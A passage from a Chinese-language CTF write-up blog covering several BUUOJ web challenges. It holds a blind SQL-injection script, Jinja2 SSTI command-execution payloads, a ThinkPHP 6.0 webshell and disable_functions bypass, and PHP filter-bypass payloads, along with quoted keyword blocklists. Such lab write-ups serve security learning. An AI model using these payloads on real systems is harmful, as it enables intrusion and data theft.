requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span> :<br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># payload = f&#x27;1/**/and/**/if(ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            <span class="hljs-comment"># payload = f&#x27;1/**/and/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;ctf&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            <span class="hljs-comment"># payload = f&#x27;1/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            payload = <span class="hljs-string">f&#x27;1/**/and/**/if(ascii(substr((select/**/group_concat(value)/**/from/**/ctf.flag),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)%23&#x27;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            url = <span class="hljs-string">f&quot;http://14923311-8407-4f70-8f44-eb198e94d0b7.node5.buuoj.cn:81/?stunum=<span class="hljs-subst">&#123;payload&#125;</span>&quot;</span><br><br>            r = requests.get(url=url)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>                low = mid + <span class="hljs-number">1</span><br>                time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += <span class="hljs-built_in">chr</span>(low)<br>            <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072018649.png" srcset="/img/loading.gif" lazyload alt="image-20240324213651066"></p>
<p>发现源码中有提示</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Parameter Name: search --&gt;</span><br><span class="hljs-comment">&lt;!-- Method: GET --&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml"> *#通过回显判断SSTI*</span><br></code></pre></td></tr></table></figure>

<p>尝试ssti注入，经过测试判断为jinja2</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#爆出所有类</span><br></code></pre></td></tr></table></figure>

<p>脚本查找可利用的类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> html<br><span class="hljs-keyword">import</span> time<br><br>index = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">170</span>, <span class="hljs-number">1000</span>):<br>    <span class="hljs-keyword">try</span>:<br>        url = <span class="hljs-string">&quot;http://17ad255a-204e-4624-b878-e3e0d62e526a.node3.buuoj.cn/?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;]&#125;&#125;&quot;</span><br>        r = requests.get(url)<br>        res = re.findall(<span class="hljs-string">&quot;&lt;h2&gt;You searched for:&lt;\/h2&gt;\W+&lt;h3&gt;(.*)&lt;\/h3&gt;&quot;</span>, r.text)<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-comment"># print(res)</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        res = html.unescape(res[<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot; | &quot;</span> + res)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;subprocess.Popen&quot;</span> <span class="hljs-keyword">in</span> res:<br>            index = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;indexo of subprocess.Popen:&quot;</span> + <span class="hljs-built_in">str</span>(index))<br><br></code></pre></td></tr></table></figure>

<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payload:</span><br><span class="language-xml"></span><br><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[258](<span class="hljs-name">&#x27;ls&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[258](<span class="hljs-name">&#x27;ls /flasklight&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[258](<span class="hljs-name">&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>测试发现网页框架thinkphp v6.0.0</p>
<p><em>主要考察ThinkPHP6.0的一个任意文件写入的CVE以及突破disable_function的方法。</em></p>
<p>使用dirsearch扫出来<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>下载下来看源码目录</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404252111710.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>在web&#x2F;home&#x2F;controller有一个Member.php，得到网页源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072038303.png" srcset="/img/loading.gif" lazyload alt="image-20240407203813258"></p>
<p>访问shell路径</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/runtime/</span>session/sess_1234567890123456789012345678.php<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072036189.png" srcset="/img/loading.gif" lazyload alt="image-20240407203629107"></p>
<p>有disable_function限制</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072040472.png" srcset="/img/loading.gif" lazyload alt="image-20240407204037366"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master">disable_function绕过exp</a></p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072047596.png" srcset="/img/loading.gif" lazyload alt="image-20240407204718527"></p>
<p>猜测执行readflag得到flag</p>
<p>连接蚁剑，找个能上传文件的地方，上传exp，上传到&#x2F;var&#x2F;tmp&#x2F;目录当中</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072048531.png" srcset="/img/loading.gif" lazyload alt="image-20240407204854466"></p>
<p>include包含</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072053818.png" srcset="/img/loading.gif" lazyload alt="image-20240407205302721"></p>
<p>法二：</p>
<p>利用蚁剑disabled_functions插件获取flag</p>
<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;1nD3x.php&quot;</span>;<br><span class="hljs-variable">$shana</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shana&#x27;</span>];<br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>        )  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>); <br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>) !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$shana</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || <br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) ) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); <br>&#125; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>1.$_SERVER[‘QUERY_STRING’]绕过</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>        )  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>); <br>&#125;<br></code></pre></td></tr></table></figure>

<p>几乎ban掉了所有可能使用的词</p>
<p>$_SERVER[‘QUERY_STRING’]函数不对传入的东西进行url编码，所以把payload进行url编码之后传入即可绕过</p>
<p>解决办法<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41814777/article/details/102058889">https://blog.csdn.net/qq_41814777/article/details/102058889</a>)</p>
<p>小葵转换工具</p>
<p><strong>2.preg_match绕过</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))<br><span class="hljs-regexp">//</span>不能包含http|https<br>&#123;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>])&amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>)<br> <span class="hljs-regexp">//</span>需要在debu=xxx中匹配到‘<span class="hljs-regexp">/^&amp;/</span>’，且debu不能为‘aqua_is_cute’<br>    &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <span class="hljs-regexp">//</span>用file=xxx传值<br>        echo <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> die(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>‘&#x2F;^$&#x2F;‘是正则匹配，^表示以xxx开头，$表示以xxx结尾，现在需要绕过preg_match，所以在dedu&#x3D;aqua_is_cute末尾加上换行（也就是加上%0a）</p>
<p><strong>3.$_REQUEST绕过</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>)) <br>        <span class="hljs-comment">//要求不能有字母</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125; <br></code></pre></td></tr></table></figure>

<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$_POST优先级高于$_GET,所以用POST传入的值会把$_GET中的值覆盖掉<br></code></pre></td></tr></table></figure>

<p>1和2中可知，需要用file和debu传值，所以此处用POST传入file&#x3D;xxx&amp;debu&#x3D;xxx可以绕过(xxx可以是任何不为0的数)</p>
<p><strong>4.file_get_contents绕过</strong></p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> <span class="hljs-comment">(file_get_contents($file)</span> !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    die<span class="hljs-comment">(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;)</span>;<br></code></pre></td></tr></table></figure>

<p>此处用data伪协议即可绕过（data:&#x2F;&#x2F;text&#x2F;plain,~）</p>
<p><strong>5.sha1函数、比较类型数组绕过</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$shana</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )<br><span class="hljs-comment">//既要shana和passwd传入的值不相同，又要这两个传入的值经过sha1散列之后强相等</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>sha1函数对数组不敏感，所以用shana[]&#x3D;1&amp;passwd[]&#x3D;2绕过</p>
<p>payload：</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">file</span>=data://text/plain,debu_debu_aque<span class="hljs-variable">&amp;debu</span>=aque_is_cute%0a<span class="hljs-variable">&amp;shana</span>[]=1<span class="hljs-variable">&amp;passwd</span>[]=2<br></code></pre></td></tr></table></figure>

<p>url编码之后：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">file</span>=%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>&amp;%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>=%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">63</span>%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">0</span>A&amp;%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>[]=<span class="hljs-number">1</span>&amp;%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">77</span>%<span class="hljs-number">64</span>[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p>同时POST传入file&#x3D;1&amp;debu&#x3D;1</p>
<p><strong>6.create_function运用</strong></p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">if(preg_match(&#x27;/^[a-z0-9]<span class="hljs-symbol">*</span>$/isD&#x27;, $code) ||<span class="hljs-string"> </span><br><span class="hljs-string">preg_match(&#x27;/fil</span>|<span class="hljs-string">cat</span>|<span class="hljs-string">more</span>|<span class="hljs-string">tail</span>|<span class="hljs-string">tac</span>|<span class="hljs-string">less</span>|<span class="hljs-string">head</span>|<span class="hljs-string">nl</span>|<span class="hljs-string">tailf</span>|<span class="hljs-string">ass</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">shell</span>|<span class="hljs-string">ob</span>|<span class="hljs-string">start</span>|<span class="hljs-string">mail</span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">x</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\</span>||<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">sou</span>|<span class="hljs-string">show</span>|<span class="hljs-string">cont</span>|<span class="hljs-string">high</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">scan</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">local</span>|<span class="hljs-string">sess</span>|<span class="hljs-string">id</span>|<span class="hljs-string">source</span>|<span class="hljs-string">arra</span>|<span class="hljs-string">head</span>|<span class="hljs-string">light</span>|<span class="hljs-string">print</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">read</span>|<span class="hljs-string">inc</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">1f</span>|<span class="hljs-string">info</span>|<span class="hljs-string">bin</span>|<span class="hljs-string">hex</span>|<span class="hljs-string">oct</span>|<span class="hljs-string">pi</span>|<span class="hljs-string">con</span>|<span class="hljs-string">rot</span>|<span class="hljs-string">input</span>|<span 